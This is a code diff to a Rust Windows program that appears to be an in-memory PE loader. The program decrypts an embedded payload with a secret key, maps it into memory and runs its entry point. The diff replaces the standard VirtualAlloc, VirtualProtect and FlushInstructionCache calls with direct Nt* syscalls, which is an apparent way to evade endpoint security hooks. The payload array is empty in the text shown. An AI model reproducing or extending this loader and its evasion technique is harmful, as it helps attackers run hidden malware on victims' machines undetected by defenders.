@@ -1,4 +1,7 @@
 #[cfg(windows)]
+mod syscalls;
+
+#[cfg(windows)]
 use std::{mem, ptr};
 
 #[cfg(windows)]
@@ -8,9 +11,7 @@ use winapi::um::errhandlingapi::GetLastError;
 #[cfg(windows)]
 use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
 #[cfg(windows)]
-use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
-#[cfg(windows)]
-use winapi::um::processthreadsapi::FlushInstructionCache;
+use winapi::um::processthreadsapi::GetCurrentProcess;
 #[cfg(windows)]
 use winapi::um::winnt::{
     MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY,
@@ -104,7 +105,7 @@ const SECRET_KEY: &[u8] = &[
 ];
 
 #[cfg(windows)]
-const PAYLOAD: &[u8] = &[ 
+const PAYLOAD: &[u8] = &[
 ];
 
 #[cfg(windows)]
@@ -131,9 +132,16 @@ unsafe fn set_section_permissions(image_base: *mut u8, section: &ImageSectionHea
     }
     let section_start = image_base.add(section.virtual_address as usize);
     let mut old_protect = 0;
-    let result = VirtualProtect(section_start as LPVOID, section.virtual_size as usize, protect, &mut old_protect);
-    if result == 0 {
-        return Err(format!("Failed to set section protection (error: {})", GetLastError()));
+    let mut region_size = section.virtual_size as usize;
+    let status = (syscalls::SYSCALLS.NtProtectVirtualMemory)(
+        GetCurrentProcess() as *mut _,
+        &mut (section_start as *mut _),
+        &mut region_size,
+        protect,
+        &mut old_protect,
+    );
+    if status != 0 {
+        return Err(format!("Failed to set section protection with status: {}", status));
     }
     Ok(())
 }
@@ -243,10 +251,9 @@ unsafe fn finalize_sections(image_base: *mut u8, nt_headers: *const ImageNtHeade
     for i in 0..(*nt_headers).file_header.number_of_sections {
         set_section_permissions(image_base, &*section_header_ptr.offset(i as isize))?;
     }
-    use winapi::um::processthreadsapi::GetCurrentProcess;
-    FlushInstructionCache(
-        GetCurrentProcess(),
-        image_base as LPVOID,
+    (syscalls::SYSCALLS.NtFlushInstructionCache)(
+        GetCurrentProcess() as *mut _,
+        image_base as *mut _,
         (*nt_headers).optional_header.size_of_image as usize,
     );
     Ok(())
@@ -257,7 +264,7 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
     if pe_data.len() < mem::size_of::<ImageDosHeader>() {
         return Err("PE data is too small for DOS header".to_string());
     }
-    
+
     let dos_header = &*(pe_data.as_ptr() as *const ImageDosHeader);
     if dos_header.e_magic != 0x5A4D {
         return Err("Invalid PE file (MZ signature missing)".to_string());
@@ -272,7 +279,7 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
     if nt_headers.signature != 0x4550 {
         return Err("Invalid PE signature".to_string());
     }
-    
+
     if nt_headers.optional_header.magic != 0x20b {
         return Err("Loader only supports 64-bit (x64) PE files.".to_string());
     }
@@ -282,10 +289,19 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
         return Err("Invalid PE file (SizeOfImage is zero)".to_string());
     }
 
-    let image_base = VirtualAlloc(ptr::null_mut(), image_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    let mut image_base: *mut std::ffi::c_void = ptr::null_mut();
+    let mut region_size = image_size;
+    let status = (syscalls::SYSCALLS.NtAllocateVirtualMemory)(
+        GetCurrentProcess() as *mut _,
+        &mut image_base,
+        0,
+        &mut region_size,
+        (MEM_COMMIT | MEM_RESERVE) as u32,
+        PAGE_READWRITE as u32,
+    );
 
-    if image_base.is_null() {
-        return Err(format!("Memory allocation failed (error: {})", GetLastError()));
+    if status != 0 {
+        return Err(format!("Memory allocation failed with status: {}", status));
     }
 
     let headers_size = nt_headers.optional_header.size_of_headers as usize;
@@ -312,7 +328,7 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
     process_tls_callbacks(image_base as *mut u8, nt_headers)?;
 
     let entry_point = (image_base as usize + nt_headers.optional_header.address_of_entry_point as usize) as *const ();
-    
+
     if nt_headers.optional_header.subsystem == 2 || nt_headers.optional_header.subsystem == 3 {
         let entry_fn: extern "system" fn() -> i32 = mem::transmute(entry_point);
         entry_fn();
